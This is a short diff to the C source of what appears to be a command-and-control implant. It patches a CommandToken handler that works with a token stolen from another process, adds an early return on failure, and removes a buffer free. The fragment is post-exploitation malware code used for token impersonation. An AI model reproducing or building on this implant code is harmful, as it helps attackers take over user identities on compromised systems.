@@ -1343,6 +1343,8 @@ VOID CommandToken( PPARSER Parser )
             BUFFER UserDomain   = { 0 };
             DWORD  NewTokenID   = { 0 };
 
+            // TODO: send True or False
+
             /* parse arguments */
             TargetPid    = ParserGetInt32( Parser );
             TargetHandle = C_PTR( ParserGetInt32( Parser ) );
@@ -1355,6 +1357,7 @@ VOID CommandToken( PPARSER Parser )
 
             if ( ! TokenQueryOwner( StolenToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                 PUTS( "Failed to query user/domain from stolen token" )
+                return;
             }
 
             /* TODO: pass the BUFFER struct to it instead of the PCHAR pointer */
@@ -1368,8 +1371,6 @@ VOID CommandToken( PPARSER Parser )
             PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
             PackageAddInt32( Package, NewTokenID );
             PackageAddInt32( Package, TargetPid );
-
-            DATA_FREE( UserDomain.Buffer, UserDomain.Length )
 
             break;
         }
